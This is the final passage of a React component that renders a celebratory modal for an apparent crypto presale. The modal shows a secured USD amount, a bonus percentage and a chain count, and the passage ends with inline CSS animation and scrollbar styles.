                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-amber-500/20 shadow-2xl text-center">
              <div className="relative mb-6">
                <div className="text-7xl animate-bounce">🏛️</div>
              </div>
              
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-amber-400 to-amber-300 bg-clip-text text-transparent">
                {translations.successful}
              </h2>
              
              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
              
              <div className="text-5xl font-black text-amber-400 mb-3 animate-pulse">
                ${liveDistributions[0]?.distributionAmount?.toLocaleString() || '0'} USD
              </div>
              
              <div className="inline-block bg-gradient-to-r from-amber-500/20 to-amber-600/20 px-6 py-3 rounded-full mb-4 border border-amber-500/30">
                <span className="text-2xl text-amber-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-xs text-gray-500 mb-6">
                ✓ Integrated on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
              >
                {translations.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes glow-amber {
          from { filter: drop-shadow(0 0 10px #f59e0b); }
          to { filter: drop-shadow(0 0 40px #fbbf24); }
        }
        @keyframes pulse-amber {
          0% { box-shadow: 0 0 0 0 rgba(245,158,11,.7); }
          70% { box-shadow: 0 0 0 15px rgba(245,158,11,0); }
          100% { box-shadow: 0 0 0 0 rgba(245,158,11,0); }
        }
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0.4; }
          100% { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes slideInUp {
          from { transform: translateY(100px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        
        .animate-glow-amber { animation: glow-amber 3s infinite alternate; }
        .animate-pulse-amber { animation: pulse-amber 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
        
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(245,158,11,0.1);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(245,158,11,0.4);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(245,158,11,0.6);
        }
        
        @media (max-width: 768px) {
          .fixed.bottom-6.right-6 {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
          }
        }
      `}</style>
    </div>
  );
}

export default App;
